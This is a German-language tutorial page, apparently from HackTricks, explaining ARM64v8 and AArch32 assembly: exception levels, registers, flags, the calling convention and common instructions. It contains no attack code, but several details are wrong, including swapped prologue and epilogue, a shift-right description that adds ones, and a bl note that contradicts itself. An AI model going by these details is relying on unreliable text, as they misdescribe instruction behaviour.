# Einführung in ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Ausnahmeebenen - EL (ARM64v8)**

In der ARMv8-Architektur definieren die Ausführungsebenen, bekannt als Ausnahmeebenen (ELs), das Privilegieniveau und die Fähigkeiten der Ausführungsumgebung. Es gibt vier Ausnahmeebenen, die von EL0 bis EL3 reichen, wobei jede eine andere Funktion erfüllt:

1. **EL0 - Benutzermodus**:
- Dies ist die am wenigsten privilegierte Ebene und wird für die Ausführung regulärer Anwendungssoftware verwendet.
- Anwendungen, die auf EL0 ausgeführt werden, sind voneinander und von der Systemsoftware isoliert, was die Sicherheit und Stabilität erhöht.
2. **EL1 - Betriebssystem-Kernelmodus**:
- Die meisten Betriebssystemkerne laufen auf dieser Ebene.
- EL1 hat mehr Privilegien als EL0 und kann auf Systemressourcen zugreifen, jedoch mit einigen Einschränkungen, um die Systemintegrität zu gewährleisten.
3. **EL2 - Hypervisor-Modus**:
- Diese Ebene wird für Virtualisierung verwendet. Ein Hypervisor, der auf EL2 läuft, kann mehrere Betriebssysteme (jeweils in ihrem eigenen EL1) verwalten, die auf derselben physischen Hardware laufen.
- EL2 bietet Funktionen zur Isolation und Kontrolle der virtualisierten Umgebungen.
4. **EL3 - Sicherer Monitor-Modus**:
- Dies ist die privilegierteste Ebene und wird häufig für sicheres Booten und vertrauenswürdige Ausführungsumgebungen verwendet.
- EL3 kann Zugriffe zwischen sicheren und nicht-sicheren Zuständen verwalten und steuern (wie sicheres Booten, vertrauenswürdiges OS usw.).

Die Verwendung dieser Ebenen ermöglicht eine strukturierte und sichere Verwaltung verschiedener Aspekte des Systems, von Benutzeranwendungen bis hin zu den privilegiertesten Systemsoftware. Der Ansatz von ARMv8 zu Privilegienebenen hilft, verschiedene Systemkomponenten effektiv zu isolieren, wodurch die Sicherheit und Robustheit des Systems erhöht wird.

## **Register (ARM64v8)**

ARM64 hat **31 allgemeine Register**, die von `x0` bis `x30` beschriftet sind. Jedes kann einen **64-Bit** (8-Byte) Wert speichern. Für Operationen, die nur 32-Bit-Werte erfordern, können dieselben Register im 32-Bit-Modus mit den Namen w0 bis w30 angesprochen werden.

1. **`x0`** bis **`x7`** - Diese werden typischerweise als Scratch-Register und zum Übergeben von Parametern an Unterprogramme verwendet.
- **`x0`** trägt auch die Rückgabedaten einer Funktion
2. **`x8`** - Im Linux-Kernel wird `x8` als Systemaufrufnummer für die `svc`-Anweisung verwendet. **In macOS wird x16 verwendet!**
3. **`x9`** bis **`x15`** - Weitere temporäre Register, die oft für lokale Variablen verwendet werden.
4. **`x16`** und **`x17`** - **Intra-prozedurale Aufrufregister**. Temporäre Register für unmittelbare Werte. Sie werden auch für indirekte Funktionsaufrufe und PLT (Procedure Linkage Table) Stub verwendet.
- **`x16`** wird als **Systemaufrufnummer** für die **`svc`**-Anweisung in **macOS** verwendet.
5. **`x18`** - **Plattformregister**. Es kann als allgemeines Register verwendet werden, aber auf einigen Plattformen ist dieses Register für plattformspezifische Verwendungen reserviert: Zeiger auf den aktuellen Thread-Umgebungsblock in Windows oder um auf die aktuell **ausführende Aufgabenstruktur im Linux-Kernel** zu zeigen.
6. **`x19`** bis **`x28`** - Dies sind callee-saved Register. Eine Funktion muss die Werte dieser Register für ihren Aufrufer bewahren, sodass sie im Stack gespeichert und vor der Rückkehr zum Aufrufer wiederhergestellt werden.
7. **`x29`** - **Frame-Zeiger**, um den Stackrahmen zu verfolgen. Wenn ein neuer Stackrahmen erstellt wird, weil eine Funktion aufgerufen wird, wird das **`x29`**-Register **im Stack gespeichert** und die **neue** Frame-Zeigeradresse (Adresse von **`sp`**) wird **in diesem Register gespeichert**.
- Dieses Register kann auch als **allgemeines Register** verwendet werden, obwohl es normalerweise als Referenz für **lokale Variablen** verwendet wird.
8. **`x30`** oder **`lr`** - **Link-Register**. Es hält die **Rückgabeadresse**, wenn eine `BL` (Branch with Link) oder `BLR` (Branch with Link to Register) Anweisung ausgeführt wird, indem der **`pc`**-Wert in diesem Register gespeichert wird.
- Es könnte auch wie jedes andere Register verwendet werden.
- Wenn die aktuelle Funktion eine neue Funktion aufrufen und daher `lr` überschreiben wird, wird es zu Beginn im Stack gespeichert, dies ist der Epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Speichern von `fp` und `lr`, Platz schaffen und neuen `fp` erhalten) und am Ende wiederhergestellt, dies ist der Prolog (`ldp x29, x30, [sp], #48; ret` -> Wiederherstellen von `fp` und `lr` und Rückkehr).
9. **`sp`** - **Stack-Zeiger**, der verwendet wird, um den oberen Teil des Stacks zu verfolgen.
- Der **`sp`**-Wert sollte immer mindestens auf eine **Quadword**-**Ausrichtung** gehalten werden, da sonst eine Ausrichtungsfehler auftreten kann.
10. **`pc`** - **Program Counter**, der auf die nächste Anweisung zeigt. Dieses Register kann nur durch Ausnahmeerzeugungen, Ausnahme-Rückgaben und Sprünge aktualisiert werden. Die einzigen gewöhnlichen Anweisungen, die dieses Register lesen können, sind Sprünge mit Link-Anweisungen (BL, BLR), um die **`pc`**-Adresse in **`lr`** (Link-Register) zu speichern.
11. **`xzr`** - **Null-Register**. Auch als **`wzr`** in seiner **32**-Bit-Registerform bezeichnet. Kann verwendet werden, um den Nullwert einfach zu erhalten (häufige Operation) oder um Vergleiche mit **`subs`** durchzuführen, wie **`subs XZR, Xn, #10`**, wobei die resultierenden Daten nirgendwo gespeichert werden (in **`xzr`**).

Die **`Wn`**-Register sind die **32-Bit**-Version der **`Xn`**-Register.

### SIMD- und Gleitkomma-Register

Darüber hinaus gibt es weitere **32 Register mit einer Länge von 128 Bit**, die in optimierten Single Instruction Multiple Data (SIMD)-Operationen und zur Durchführung von Gleitkomma-Arithmetik verwendet werden können. Diese werden als Vn-Register bezeichnet, obwohl sie auch in **64**-Bit, **32**-Bit, **16**-Bit und **8**-Bit betrieben werden können und dann als **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** und **`Bn`** bezeichnet werden.

### Systemregister

**Es gibt Hunderte von Systemregistern**, auch als spezielle Register (SPRs) bezeichnet, die zur **Überwachung** und **Steuerung** des Verhaltens von **Prozessoren** verwendet werden.\
Sie können nur mit den speziellen Anweisungen **`mrs`** und **`msr`** gelesen oder gesetzt werden.

Die speziellen Register **`TPIDR_EL0`** und **`TPIDDR_EL0`** sind häufig beim Reverse Engineering zu finden. Der `EL0`-Suffix zeigt die **minimale Ausnahme** an, von der aus das Register zugegriffen werden kann (in diesem Fall ist EL0 das reguläre Ausnahmeniveau (Privileg), mit dem reguläre Programme ausgeführt werden).\
Sie werden oft verwendet, um die **Basisadresse des thread-lokalen Speicherbereichs** im Speicher zu speichern. In der Regel ist das erste für Programme, die in EL0 laufen, lesbar und schreibbar, aber das zweite kann von EL0 gelesen und von EL1 (wie Kernel) geschrieben werden.

- `mrs x0, TPIDR_EL0 ; Lese TPIDR_EL0 in x0`
- `msr TPIDR_EL0, X0 ; Schreibe x0 in TPIDR_EL0`

### **PSTATE**

**PSTATE** enthält mehrere Prozesskomponenten, die in das vom Betriebssystem sichtbare **`SPSR_ELx`**-Sonderregister serialisiert sind, wobei X das **Berechtigungs**-**niveau der ausgelösten** Ausnahme angibt (dies ermöglicht es, den Prozesszustand wiederherzustellen, wenn die Ausnahme endet).\
Dies sind die zugänglichen Felder:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** und **`V`**-Bedingungsflags:
- **`N`** bedeutet, dass die Operation ein negatives Ergebnis geliefert hat
- **`Z`** bedeutet, dass die Operation null ergeben hat
- **`C`** bedeutet, dass die Operation einen Übertrag hatte
- **`V`** bedeutet, dass die Operation einen signierten Überlauf ergeben hat:
- Die Summe von zwei positiven Zahlen ergibt ein negatives Ergebnis.
- Die Summe von zwei negativen Zahlen ergibt ein positives Ergebnis.
- Bei der Subtraktion, wenn eine große negative Zahl von einer kleineren positiven Zahl (oder umgekehrt) subtrahiert wird und das Ergebnis nicht im Bereich der gegebenen Bitgröße dargestellt werden kann.
- Offensichtlich weiß der Prozessor nicht, ob die Operation signiert ist oder nicht, daher wird er C und V in den Operationen überprüfen und anzeigen, ob ein Übertrag aufgetreten ist, falls es signiert oder nicht signiert war.

> [!WARNING]
> Nicht alle Anweisungen aktualisieren diese Flags. Einige wie **`CMP`** oder **`TST`** tun dies, und andere, die ein s-Suffix haben, wie **`ADDS`**, tun es ebenfalls.

- Das aktuelle **Registerbreite (`nRW`) Flag**: Wenn das Flag den Wert 0 hat, wird das Programm im AArch64-Ausführungszustand fortgesetzt, sobald es wieder aufgenommen wird.
- Das aktuelle **Ausnahmelevel** (**`EL`**): Ein reguläres Programm, das in EL0 läuft, hat den Wert 0
- Das **Single-Stepping**-Flag (**`SS`**): Wird von Debuggern verwendet, um einen Schritt auszuführen, indem das SS-Flag auf 1 innerhalb von **`SPSR_ELx`** durch eine Ausnahme gesetzt wird. Das Programm führt einen Schritt aus und löst eine Einzelstepp-Ausnahme aus.
- Das **illegal exception**-Zustandsflag (**`IL`**): Es wird verwendet, um zu kennzeichnen, wann eine privilegierte Software einen ungültigen Ausnahmelevel-Transfer durchführt, dieses Flag wird auf 1 gesetzt und der Prozessor löst eine illegale Zustandsausnahme aus.
- Die **`DAIF`**-Flags: Diese Flags ermöglichen es einem privilegierten Programm, bestimmte externe Ausnahmen selektiv zu maskieren.
- Wenn **`A`** 1 ist, bedeutet dies, dass **asynchrone Abbrüche** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware-**Interrupt-Anfragen** (IRQs). und das F bezieht sich auf **Fast Interrupt Requests** (FIRs).
- Die **Stack-Zeiger-Auswahl**-Flags (**`SPS`**): Privilegierte Programme, die in EL1 und höher laufen, können zwischen der Verwendung ihres eigenen Stack-Zeiger-Registers und dem Benutzer-Modell wechseln (z. B. zwischen `SP_EL1` und `EL0`). Dieser Wechsel erfolgt durch Schreiben in das **`SPSel`**-Sonderregister. Dies kann nicht von EL0 aus erfolgen.

## **Aufrufkonvention (ARM64v8)**

Die ARM64-Aufrufkonvention legt fest, dass die **ersten acht Parameter** an eine Funktion in den Registern **`x0` bis `x7`** übergeben werden. **Zusätzliche** Parameter werden auf dem **Stack** übergeben. Der **Rückgabewert** wird im Register **`x0`** oder in **`x1`** zurückgegeben, wenn er **128 Bit lang** ist. Die Register **`x19`** bis **`x30`** und **`sp`** müssen **bewahrt** werden, wenn Funktionsaufrufe erfolgen.

Beim Lesen einer Funktion in Assembler sollte man nach dem **Funktionsprolog und -epilog** suchen. Der **Prolog** umfasst normalerweise das **Speichern des Frame-Zeigers (`x29`)**, das **Einrichten** eines **neuen Frame-Zeigers** und das **Zuweisen von Stackplatz**. Der **Epilog** umfasst normalerweise das **Wiederherstellen des gespeicherten Frame-Zeigers** und das **Rückkehren** aus der Funktion.

### Aufrufkonvention in Swift

Swift hat seine eigene **Aufrufkonvention**, die in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) zu finden ist.

## **Häufige Anweisungen (ARM64v8)**

ARM64-Anweisungen haben im Allgemeinen das **Format `opcode dst, src1, src2`**, wobei **`opcode`** die **auszuführende Operation** (wie `add`, `sub`, `mov` usw.) ist, **`dst`** das **Zielregister**, in dem das Ergebnis gespeichert wird, und **`src1`** und **`src2`** die **Quellregister** sind. Sofortwerte können auch anstelle von Quellregistern verwendet werden.

- **`mov`**: **Bewege** einen Wert von einem **Register** in ein anderes.
- Beispiel: `mov x0, x1` — Dies bewegt den Wert von `x1` nach `x0`.
- **`ldr`**: **Lade** einen Wert aus dem **Speicher** in ein **Register**.
- Beispiel: `ldr x0, [x1]` — Dies lädt einen Wert von der Speicheradresse, die von `x1` angegeben wird, in `x0`.
- **Offset-Modus**: Ein Offset, der den ursprünglichen Zeiger beeinflusst, wird angegeben, zum Beispiel:
- `ldr x2, [x1, #8]`, dies lädt in x2 den Wert von x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, dies lädt in x2 ein Objekt aus dem Array x0, von der Position x1 (Index) \* 4
- **Pre-indexierter Modus**: Dies wendet Berechnungen auf den Ursprung an, erhält das Ergebnis und speichert auch den neuen Ursprung im Ursprung.
- `ldr x2, [x1, #8]!`, dies lädt `x1 + 8` in `x2` und speichert das Ergebnis in x1
- `str lr, [sp, #-4]!`, Speichert das Link-Register in sp und aktualisiert das Register sp
- **Post-indexierter Modus**: Dies ist wie der vorherige, aber die Speicheradresse wird zuerst zugegriffen und dann wird der Offset berechnet und gespeichert.
- `ldr x0, [x1], #8`, lade `x1` in `x0` und aktualisiere x1 mit `x1 + 8`
- **PC-relative Adressierung**: In diesem Fall wird die Adresse, die geladen werden soll, relativ zum PC-Register berechnet
- `ldr x1, =_start`, Dies lädt die Adresse, an der das `_start`-Symbol beginnt, in x1 in Bezug auf den aktuellen PC.
- **`str`**: **Speichere** einen Wert von einem **Register** in den **Speicher**.
- Beispiel: `str x0, [x1]` — Dies speichert den Wert in `x0` an der Speicheradresse, die von `x1` angegeben wird.
- **`ldp`**: **Lade ein Paar von Registern**. Diese Anweisung **lädt zwei Register** aus **aufeinanderfolgenden Speicher**-Standorten. Die Speicheradresse wird typischerweise gebildet, indem ein Offset zum Wert in einem anderen Register hinzugefügt wird.
- Beispiel: `ldp x0, x1, [x2]` — Dies lädt `x0` und `x1` von den Speicherorten bei `x2` und `x2 + 8`.
- **`stp`**: **Speichere ein Paar von Registern**. Diese Anweisung **speichert zwei Register** in **aufeinanderfolgende Speicher**-Standorte. Die Speicheradresse wird typischerweise gebildet, indem ein Offset zum Wert in einem anderen Register hinzugefügt wird.
- Beispiel: `stp x0, x1, [sp]` — Dies speichert `x0` und `x1` an den Speicherorten bei `sp` und `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Dies speichert `x0` und `x1` an den Speicherorten bei `sp+16` und `sp + 24` und aktualisiert `sp` mit `sp+16`.
- **`add`**: **Addiere** die Werte von zwei Registern und speichere das Ergebnis in einem Register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Ziel
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (Register oder sofort)
- \[shift #N | RRX] -> Führe eine Verschiebung durch oder rufe RRX auf
- Beispiel: `add x0, x1, x2` — Dies addiert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- `add x5, x5, #1, lsl #12` — Dies entspricht 4096 (ein 1-Verschieber 12 Mal) -> 1 0000 0000 0000 0000
- **`adds`** Dies führt ein `add` aus und aktualisiert die Flags
- **`sub`**: **Subtrahiere** die Werte von zwei Registern und speichere das Ergebnis in einem Register.
- Überprüfe die **`add`**-**Syntax**.
- Beispiel: `sub x0, x1, x2` — Dies subtrahiert den Wert in `x2` von `x1` und speichert das Ergebnis in `x0`.
- **`subs`** Dies ist wie sub, aber aktualisiert das Flag
- **`mul`**: **Multipliziere** die Werte von **zwei Registern** und speichere das Ergebnis in einem Register.
- Beispiel: `mul x0, x1, x2` — Dies multipliziert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- **`div`**: **Dividiere** den Wert eines Registers durch einen anderen und speichere das Ergebnis in einem Register.
- Beispiel: `div x0, x1, x2` — Dies dividiert den Wert in `x1` durch `x2` und speichert das Ergebnis in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logische Verschiebung nach links**: Füge 0en am Ende hinzu, während die anderen Bits nach vorne verschoben werden (multipliziere mit n-mal 2)
- **Logische Verschiebung nach rechts**: Füge 1en am Anfang hinzu, während die anderen Bits nach hinten verschoben werden (dividiere mit n-mal 2 in unsigned)
- **Arithmetische Verschiebung nach rechts**: Wie **`lsr`**, aber anstelle von 0en, wenn das bedeutendste Bit 1 ist, werden **1en hinzugefügt** (teile mit n-mal 2 in signed)
- **Rechtsrotation**: Wie **`lsr`**, aber was von rechts entfernt wird, wird links angehängt
- **Rechtsrotation mit Erweiterung**: Wie **`ror`**, aber mit dem Übertragsflag als "bedeutendstes Bit". Das Übertragsflag wird also auf Bit 31 verschoben und das entfernte Bit in das Übertragsflag.
- **`bfm`**: **Bitfeldverschiebung**, diese Operationen **kopieren Bits `0...n`** von einem Wert und platzieren sie in den Positionen **`m..m+n`**. Die **`#s`** gibt die **linkeste Bitposition** an und **`#r`** die **Verschiebung nach rechts**.
- Bitfeldverschiebung: `BFM Xd, Xn, #r`
- Signierte Bitfeldverschiebung: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfeldverschiebung: `UBFM Xd, Xn, #r, #s`
- **Bitfeld extrahieren und einfügen:** Kopiere ein Bitfeld von einem Register und kopiere es in ein anderes Register.
- **`BFI X1, X2, #3, #4`** Füge 4 Bits von X2 ab dem 3. Bit von X1 ein
- **`BFXIL X1, X2, #3, #4`** Extrahiere von dem 3. Bit von X2 vier Bits und kopiere sie nach X1
- **`SBFIZ X1, X2, #3, #4`** Signerweitere 4 Bits von X2 und füge sie in X1 ein, beginnend bei Bitposition 3, wobei die rechten Bits auf 0 gesetzt werden
- **`SBFX X1, X2, #3, #4`** Extrahiert 4 Bits, die bei Bit 3 von X2 beginnen, signiert sie und platziert das Ergebnis in X1
- **`UBFIZ X1, X2, #3, #4`** Nullerweitert 4 Bits von X2 und fügt sie in X1 ein, beginnend bei Bitposition 3, wobei die rechten Bits auf 0 gesetzt werden
- **`UBFX X1, X2, #3, #4`** Extrahiert 4 Bits, die bei Bit 3 von X2 beginnen, und platziert das nullerweitere Ergebnis in X1.
- **Sign Extend To X:** Erweitert das Vorzeichen (oder fügt einfach 0en in der unsigned-Version hinzu) eines Wertes, um Operationen damit durchführen zu können:
- **`SXTB X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 nach X1** (`W2` ist die Hälfte von `X2`), um die 64 Bits zu füllen
- **`SXTH X1, W2`** Erweitert das Vorzeichen einer 16-Bit-Zahl **von W2 nach X1**, um die 64 Bits zu füllen
- **`SXTW X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 nach X1**, um die 64 Bits zu füllen
- **`UXTB X1, W2`** Fügt 0en (unsigned) zu einem Byte **von W2 nach X1** hinzu, um die 64 Bits zu füllen
- **`extr`:** Extrahiert Bits aus einem angegebenen **Paar von zusammengefügten Registern**.
- Beispiel: `EXTR W3, W2, W1, #3` Dies wird **W1+W2 zusammenfügen** und **von Bit 3 von W2 bis Bit 3 von W1** extrahieren und in W3 speichern.
- **`cmp`**: **Vergleiche** zwei Register und setze Bedingungsflags. Es ist ein **Alias von `subs`**, der das Zielregister auf das Nullregister setzt. Nützlich, um zu wissen, ob `m == n`.
- Es unterstützt die **gleiche Syntax wie `subs`**
- Beispiel: `cmp x0, x1` — Dies vergleicht die Werte in `x0` und `x1` und setzt die Bedingungsflags entsprechend.
- **`cmn`**: **Vergleiche negativen** Operanden. In diesem Fall ist es ein **Alias von `adds`** und unterstützt die gleiche Syntax. Nützlich, um zu wissen, ob `m == -n`.
- **`ccmp`**: Bedingter Vergleich, es ist ein Vergleich, der nur durchgeführt wird, wenn ein vorheriger Vergleich wahr war und speziell die nzcv-Bits setzt.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> wenn x1 != x2 und x3 < x4, springe zu func
- Dies liegt daran, dass **`ccmp`** nur ausgeführt wird, wenn der **vorherige `cmp` ein `NE` war**, wenn nicht, werden die Bits `nzcv` auf 0 gesetzt (was den `blt`-Vergleich nicht erfüllt).
- Dies kann auch als `ccmn` verwendet werden (dasselbe, aber negativ, wie `cmp` vs `cmn`).
- **`tst`**: Überprüft, ob einer der Werte des Vergleichs beide 1 sind (es funktioniert wie ein ANDS, ohne das Ergebnis irgendwo zu speichern). Es ist nützlich, um ein Register mit einem Wert zu überprüfen und zu sehen, ob eines der Bits des Registers, das im Wert angegeben ist, 1 ist.
- Beispiel: `tst X1, #7` Überprüfe, ob eines der letzten 3 Bits von X1 1 ist
- **`teq`**: XOR-Operation, die das Ergebnis verwirft
- **`b`**: Unbedingter Sprung
- Beispiel: `b myFunction`
- Beachte, dass dies das Link-Register nicht mit der Rückgabeadresse füllt (nicht geeignet für Unterprogrammaufrufe, die zurückkehren müssen)
- **`bl`**: **Sprung** mit Link, verwendet, um ein **Unterprogramm** aufzurufen. Speichert die **Rückgabeadresse in `x30`**.
- Beispiel: `bl myFunction` — Dies ruft die Funktion `myFunction` auf und speichert die Rückgabeadresse in `x30`.
- Beachte, dass dies das Link-Register nicht mit der Rückgabeadresse füllt (nicht geeignet für Unterprogrammaufrufe, die zurückkehren müssen)
- **`blr`**: **Sprung** mit Link zu Register, verwendet, um ein **Unterprogramm** aufzurufen, bei dem das Ziel in einem **Register** angegeben ist. Speichert die Rückgabeadresse in `x30`. (Dies ist
- Beispiel: `blr x1` — Dies ruft die Funktion auf, deren Adresse in `x1` enthalten ist, und speichert die Rückgabeadresse in `x30`.
- **`ret`**: **Rückkehr** aus dem **Unterprogramm**, typischerweise unter Verwendung der Adresse in **`x30`**.
- Beispiel: `ret` — Dies kehrt aus dem aktuellen Unterprogramm unter Verwendung der Rückgabeadresse in `x30` zurück.
- **`b.<cond>`**: Bedingte Sprünge
- **`b.eq`**: **Sprung, wenn gleich**, basierend auf der vorherigen `cmp`-Anweisung.
- Beispiel: `b.eq label` — Wenn die vorherige `cmp`-Anweisung zwei gleiche Werte gefunden hat, springt dies zu `label`.
- **`b.ne`**: **Sprung, wenn nicht gleich**. Diese Anweisung überprüft die Bedingungsflags (die von einer vorherigen Vergleichsanweisung gesetzt wurden), und wenn die verglichenen Werte nicht gleich waren, springt sie zu einem Label oder einer Adresse.
- Beispiel: Nach einer `cmp x0, x1`-Anweisung, `b.ne label` — Wenn die Werte in `x0` und `x1` nicht gleich waren, springt dies zu `label`.
- **`cbz`**: **Vergleiche und springe bei Null**. Diese Anweisung vergleicht ein Register mit null, und wenn sie gleich sind, springt sie zu einem Label oder einer Adresse.
- Beispiel: `cbz x0, label` — Wenn der Wert in `x0` null ist, springt dies zu `label`.
- **`cbnz`**: **Vergleiche und springe bei Nicht-Null**. Diese Anweisung vergleicht ein Register mit null, und wenn sie nicht gleich sind, springt sie zu einem Label oder einer Adresse.
- Beispiel: `cbnz x0, label` — Wenn der Wert in `x0` nicht null ist, springt dies zu `label`.
- **`tbnz`**: Teste Bit und springe bei Nicht-Null
- Beispiel: `tbnz x0, #8, label`
- **`tbz`**: Teste Bit und springe bei Null
- Beispiel: `tbz x0, #8, label`
- **Bedingte Auswahloperationen**: Dies sind Operationen, deren Verhalten von den bedingten Bits abhängt.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Wenn wahr, X0 = X1, wenn falsch, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Wenn wahr, Xd = Xn + 1, wenn falsch, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Wenn wahr, Xd = NOT(Xn), wenn falsch, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = - Xm
- `cneg Xd, Xn, cond` -> Wenn wahr, Xd = - Xn, wenn falsch, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Wenn wahr, Xd = 1, wenn falsch, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Wenn wahr, Xd = \<alle 1>, wenn falsch, Xd = 0
- **`adrp`**: Berechne die **Seitenadresse eines Symbols** und speichere sie in einem Register.
- Beispiel: `adrp x0, symbol` — Dies berechnet die Seitenadresse von `symbol` und speichert sie in `x0`.
- **`ldrsw`**: **Lade** einen signierten **32-Bit**-Wert aus dem Speicher und **signiere ihn auf 64** Bits.
- Beispiel: `ldrsw x0, [x1]` — Dies lädt einen signierten 32-Bit-Wert von der Speicheradresse, die von `x1` angegeben wird, signiert ihn auf 64 Bits und speichert ihn in `x0`.
- **`stur`**: **Speichere einen Registerwert an einer Speicheradresse**, unter Verwendung eines Offsets von einem anderen Register.
- Beispiel: `stur x0, [x1, #4]` — Dies speichert den Wert in `x0` an der Speicheradresse, die 4 Bytes größer ist als die Adresse, die derzeit in `x1` steht.
- **`svc`** : Führe einen **Systemaufruf** aus. Es steht für "Supervisor Call". Wenn der Prozessor diese Anweisung ausführt, **wechselt er vom Benutzermodus in den Kernelmodus** und springt zu einem bestimmten Ort im Speicher, an dem sich der **Systemaufrufbehandlungs**-Code des Kernels befindet.

- Beispiel:

```armasm
mov x8, 93  ; Lade die Systemaufrufnummer für exit (93) in das Register x8.
mov x0, 0   ; Lade den Exit-Statuscode (0) in das Register x0.
svc 0       ; Führe den Systemaufruf aus.
```

### **Funktionsprolog**

1. **Speichere das Link-Register und den Frame-Zeiger im Stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Richten Sie den neuen Frame-Zeiger ein**: `mov x29, sp` (richtet den neuen Frame-Zeiger für die aktuelle Funktion ein)
3. **Reservieren Sie Speicher auf dem Stack für lokale Variablen** (falls erforderlich): `sub sp, sp, <size>` (wobei `<size>` die benötigte Anzahl von Bytes ist)

### **Funktions-Epilog**

1. **Geben Sie lokale Variablen frei (falls welche reserviert wurden)**: `add sp, sp, <size>`
2. **Stellen Sie das Link-Register und den Frame-Zeiger wieder her**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gibt die Kontrolle an den Aufrufer zurück, indem die Adresse im Link-Register verwendet wird)

## AARCH32 Ausführungszustand

Armv8-A unterstützt die Ausführung von 32-Bit-Programmen. **AArch32** kann in einem von **zwei Befehlssätzen** laufen: **`A32`** und **`T32`** und kann zwischen ihnen über **`interworking`** wechseln.\
**Privilegierte** 64-Bit-Programme können die **Ausführung von 32-Bit**-Programmen planen, indem sie einen Ausnahmeebenenübergang zur weniger privilegierten 32-Bit-Ebene ausführen.\
Beachten Sie, dass der Übergang von 64-Bit zu 32-Bit mit einer Senkung der Ausnahmeebene erfolgt (zum Beispiel ein 64-Bit-Programm in EL1, das ein Programm in EL0 auslöst). Dies geschieht, indem das **Bit 4 von** **`SPSR_ELx`** speziellen Register **auf 1** gesetzt wird, wenn der `AArch32`-Prozess-Thread bereit ist, ausgeführt zu werden, und der Rest von `SPSR_ELx` speichert den **`AArch32`**-Programms CPSR. Dann ruft der privilegierte Prozess die **`ERET`**-Anweisung auf, damit der Prozessor zu **`AArch32`** wechselt und in A32 oder T32 je nach CPSR\*\*.\*\*

Das **`interworking`** erfolgt unter Verwendung der J- und T-Bits des CPSR. `J=0` und `T=0` bedeutet **`A32`** und `J=0` und `T=1` bedeutet **T32**. Dies bedeutet im Wesentlichen, dass das **niedrigste Bit auf 1** gesetzt wird, um anzuzeigen, dass der Befehlssatz T32 ist.\
Dies wird während der **interworking branch instructions** gesetzt, kann aber auch direkt mit anderen Anweisungen gesetzt werden, wenn der PC als Zielregister festgelegt ist. Beispiel:

Ein weiteres Beispiel:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Register

Es gibt 16 32-Bit-Register (r0-r15). **Von r0 bis r14** können sie für **jede Operation** verwendet werden, jedoch sind einige von ihnen normalerweise reserviert:

- **`r15`**: Programmzähler (immer). Enthält die Adresse der nächsten Anweisung. In A32 aktuell + 8, in T32, aktuell + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-prozeduraler Aufrufregister
- **`r13`**: Stack Pointer
- **`r14`**: Link Register

Darüber hinaus werden Register in **`banked registries`** gesichert. Dies sind Orte, die die Werte der Register speichern und einen **schnellen Kontextwechsel** bei der Ausnahmebehandlung und privilegierten Operationen ermöglichen, um die Notwendigkeit zu vermeiden, Register jedes Mal manuell zu speichern und wiederherzustellen.\
Dies geschieht durch **Speichern des Prozessorstatus von `CPSR` in `SPSR`** des Prozessormodus, in den die Ausnahme auftritt. Bei der Rückkehr von der Ausnahme wird der **`CPSR`** aus dem **`SPSR`** wiederhergestellt.

### CPSR - Aktueller Programmstatusregister

In AArch32 funktioniert der CPSR ähnlich wie **`PSTATE`** in AArch64 und wird auch in **`SPSR_ELx`** gespeichert, wenn eine Ausnahme auftritt, um die Ausführung später wiederherzustellen:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die Felder sind in einige Gruppen unterteilt:

- Application Program Status Register (APSR): Arithmetische Flags und zugänglich von EL0
- Ausführungsstatusregister: Prozessverhalten (verwaltet vom OS).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** Flags (genau wie in AArch64)
- Das **`Q`** Flag: Es wird auf 1 gesetzt, wann immer **ganzzahlige Sättigung auftritt** während der Ausführung einer spezialisierten saturierenden arithmetischen Anweisung. Sobald es auf **`1`** gesetzt ist, behält es den Wert, bis es manuell auf 0 gesetzt wird. Darüber hinaus gibt es keine Anweisung, die seinen Wert implizit überprüft, dies muss manuell gelesen werden.
- **`GE`** (Größer oder gleich) Flags: Es wird in SIMD (Single Instruction, Multiple Data) Operationen verwendet, wie "parallele Addition" und "parallele Subtraktion". Diese Operationen ermöglichen die Verarbeitung mehrerer Datenpunkte in einer einzigen Anweisung.

